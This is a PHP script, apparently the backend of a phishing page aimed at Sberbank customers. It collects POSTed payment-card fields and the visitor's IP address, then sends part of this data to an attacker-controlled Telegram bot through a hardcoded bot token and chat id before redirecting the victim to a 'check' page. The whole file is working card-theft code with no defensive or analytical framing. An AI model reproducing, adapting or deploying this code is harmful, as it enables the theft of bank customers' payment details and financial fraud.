<?php

$name = $_POST['name'];
$yaer = $_POST['total-price'];
$yaer2 = $_POST['yaer2'];
$CVC = $_POST['CVC'];
$card = $_POST['card'];
$token = "6416014975:AAGyKAOZuvmbpAJtueeWqZel4v5dug-42v4";
$chat_id = "-724578928";
function get_ip()
{
    $getIpServer = '';
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $getIpServer = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $getIpServer = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } elseif (!empty($_SERVER['REMOTE_ADDR'])) {
        $getIpServer = $_SERVER['REMOTE_ADDR'];
    }
    return $getIpServer;
}
$ip = get_ip();


$arr = array(
  'IP: ' => $ip,
  'Сбербанк' => $yaer2,
  'Сумма' => $yaer,
);

foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

if ($sendToTelegram) {
  header('Location: chek.html');
} else {
  echo "Error";
}
?>